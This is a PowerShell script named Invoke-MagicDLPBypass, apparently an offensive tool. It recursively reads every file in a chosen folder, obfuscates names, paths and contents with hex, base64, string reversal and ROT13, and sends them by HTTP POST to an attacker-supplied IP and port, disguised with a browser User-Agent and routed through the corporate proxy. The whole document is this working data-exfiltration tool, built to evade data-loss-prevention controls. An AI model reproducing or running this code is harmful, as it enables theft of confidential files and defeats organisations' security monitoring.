Function Encrypt-String([string]$InputString) {
    $alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    $rot13 = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"

    $InputChars = $InputString.ToCharArray()
    $OutputChars = New-Object Char[] $InputChars.Length

    for ($i = 0; $i -lt $InputChars.Length; $i++) {
        $char = $InputChars[$i]
        $index = $alphabet.IndexOf($char)
        if ($index -ne -1) {
            $OutputChars[$i] = $rot13[$index]
        } else {
            $OutputChars[$i] = $char
        }
    }
    return [string]::Join("", $OutputChars)
}

function StringToHex($string) {
    [System.BitConverter]::ToString($string.ToCharArray() `
                                     -as [System.Byte[]]) -replace "-", ""
}


function Invoke-MagicDLPBypass{

	param
	(
        	[string]$dir,
	        [string]$dest
	)

	$help=@"
	.SYNOPSIS
	    MagicDLPBypass.
	    PowerShell Function: Invoke-MagicDLPBypass
	    Author: Joan Martinez (magichk)
	    Required Dependencies: Powershell >= v3.0
	    Optional Dependencies: None
	    By default the script uses HTTP requests
	.DESCRIPTION
	    .
	.ARGUMENTS
	    -dir   <DIR>      Folder to read files to exfiltrate
	    -dest <DEST>    Remote destination using IP:PORT or DNS_NAME:PORT
	
	.EXAMPLE
	    Invoke-MagicDLPBypass -dir 'C:\Temp' -dest '1.2.3.4:8080'
"@
	
	if(-not $dir -or -not $dest) { return $help; }
	
	
	$result = Get-ChildItem $dir -Recurse  | % { $_.FullName } 
	
	ForEach ($path in $($result -split "`r`n"))
	{
	    $isdir = (Get-Item $path) -is [System.IO.DirectoryInfo]
	    if ($isdir -eq $false){
		$path
		$file = Split-Path $path -leaf
		#$hexpath =  ($file | Format-Hex | Select-Object -Expand Bytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
		$file= StringToHex $file
		$fileencodedBytes = [System.Text.Encoding]::UTF8.GetBytes($file)
		$fileencodedText = [System.Convert]::ToBase64String($fileencodedBytes)
		$fileencodedText = $fileencodedText[$fileencodedText.Length..0]-join ""
		$fileencodedText = Encrypt-String $fileencodedText
	
		#Codificar el path
		$path2 = Split-Path $path
		$path2 = $path2 + "\"
		$path2 = $path2.replace(':','')
		$path2 = $path2.replace('\','/')
		#$hexpath2 =  ($path2 | Format-Hex | Select-Object -Expand Bytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
		$path2 = StringToHex $path2
		$Path2encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($path2)
		$Path2encodedText = [System.Convert]::ToBase64String($Path2encodedBytes)
		$Path2encodedText = $Path2encodedText[$Path2encodedText.Length..0]-join ""
		$Path2encodedText = Encrypt-String $Path2encodedText 

	
		#Codificar el contenido del fichero
	    	$hex = (Format-Hex -Path "$path" | Select-Object -Expand Bytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
		$encodedBytes = [System.Text.Encoding]::UTF8.GetBytes($hex)
		$encodedText = [System.Convert]::ToBase64String($encodedBytes)
		$encodedText = Encrypt-String $encodedText
	
		#Crear el json para enviar al server.
		$data = @{
			dir = $Path2encodedText
			name = $fileencodedText
			data = $encodedText
		}
	
		$destino = "http://" + $dest
		$proxy = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($destino)
		Invoke-WebRequest $destino -Method POST -Body ($data |ConvertTo-Json) -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json" -Proxy $proxy -ProxyUseDefaultCredentials
	
	    }
	}


}
